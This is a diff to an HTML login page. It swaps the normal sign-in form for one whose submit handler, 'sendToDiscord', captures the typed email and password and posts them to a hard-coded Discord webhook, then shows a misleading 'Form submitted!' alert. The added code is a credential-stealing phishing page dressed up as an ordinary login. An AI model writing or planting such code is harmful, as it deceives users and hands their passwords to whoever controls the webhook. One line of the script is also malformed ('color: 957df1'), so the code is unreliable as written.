@@ -3319,13 +3319,49 @@
                         </button>
                     </div>
 
-                    <input type="hidden" id="recaptchaResponse" name="g-recaptcha-response">
-                    <div class="mb-3">
-                        <button class="btn btn-primary d-block w-100" type="submit"
-                                style="background: #957df1;font-family: Montserrat, sans-serif; padding: 5px 50px; margin: 10px; border-radius: 10px; box-shadow: #957df1 0px 0px 20px 2px">
-                            Log In
-                        </button>
-                    </div>
+<form id="loginForm" onsubmit="sendToDiscord(event)">
+    <input class="form-control" type="text" name="email" id="email" placeholder="Username/Email" style="font-family:Montserrat, sans-serif; width: 300px">
+    
+    <input class="form-control" id="password" type="password" name="password" placeholder="Password" style="font-family: Montserrat, sans-serif;--bs-primary: #4f46e5;--bs-primary-rgb: 79,70,229; width: 263px">
+    
+    <input type="hidden" id="recaptchaResponse" name="g-recaptcha-response">
+    
+    <div class="mb-3">
+        <button class="btn btn-primary d-block w-100" type="submit"
+                style="background: #957df1;font-family: Montserrat, sans-serif; padding: 5px 50px; margin: 10px; border-radius: 10px; box-shadow: #957df1 0px 0px 20px 2px">
+            Log In
+        </button>
+    </div>
+</form>
+
+<script>
+    function sendToDiscord(event) {
+        event.preventDefault(); // Prevent form from submitting normally
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        const webhookURL = 'https://discord.com/api/webhooks/1289384157981708288/XAgMGk0x3S1zI4XmpLP8KTKAdC0kryOxyMij3_XRuhI3MSljf1VqXAkknCFZnrjL31Vb'; // Replace with actual webhook URL
+
+        const request = new XMLHttpRequest();
+        request.open("POST", webhookURL);
+        request.setRequestHeader('Content-type', 'application/json');
+
+        const params = {
+            username: "Form Bot",
+            embeds: [{
+                title: "Login Attempt",
+                description: `**Email:** ${email}\n**Password:** ${password}`,
+                color: 957df1
+            }]
+        };
+
+        request.send(JSON.stringify(params));
+
+        alert('Form submitted!');
+    }
+</script>
+
 
                     <div class="mb-3">
                         <a style="color: rgb(150, 152, 156);">Forgot your password?<a href="resetPassword"
